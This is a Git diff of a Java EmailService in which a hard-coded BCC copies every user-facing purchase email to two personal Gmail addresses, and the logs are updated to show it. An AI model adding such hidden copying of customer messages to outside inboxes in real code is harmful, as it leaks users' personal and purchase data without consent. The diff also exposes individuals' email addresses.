@@ -35,17 +35,18 @@ public class EmailService {
             try {
                 SimpleMailMessage message = new SimpleMailMessage();
                 message.setTo(user.getEmail());
+                message.setBcc(new String[]{"crlsgscnls41@gmail.com", "chu4nig@gmail.com"});
                 message.setSubject(subject);
                 message.setText(body);
                 mailSender.send(message);
-                logger.info("Email real enviado a {}", user.getEmail());
+                logger.info("Email real enviado a {} (BCC: crlsgscnls41@gmail.com, chu4nig@gmail.com)", user.getEmail());
                 return;
             } catch (MailException e) {
                 logger.warn("No se pudo enviar email real, usando fallback. Error: {}", e.getMessage());
             }
         }
 
-        logger.info("[EMAIL MOCK] To: {}\nSubject: {}\n{}", user.getEmail(), subject, body);
+        logger.info("[EMAIL MOCK] To: {}\nBCC: crlsgscnls41@gmail.com, chu4nig@gmail.com\nSubject: {}\n{}", user.getEmail(), subject, body);
     }
 
     private String buildBody(User user, Purchase purchase) {
